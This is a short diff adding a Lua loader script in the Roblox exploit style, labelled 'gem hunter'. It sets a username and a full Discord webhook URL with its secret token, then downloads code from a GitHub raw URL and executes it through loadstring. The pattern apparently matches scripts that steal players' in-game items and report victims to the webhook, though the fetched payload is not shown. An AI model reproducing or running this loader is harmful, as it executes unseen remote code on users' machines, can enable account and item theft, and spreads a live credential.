@@ -1,0 +1,6 @@
+G. Username "LAKKO_PAQPA"
+G. HubName "gem hunter"
+
+G. WebhookUr1 "https://discord.com/api/webhooks/1304481326044414004/bD00snzVuAtHa--XNlfZavMoTroll75yMNfccqM8eIcmmVwAZcgYwCM-7Akohu6r232c"
+
+loadstring(game: HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
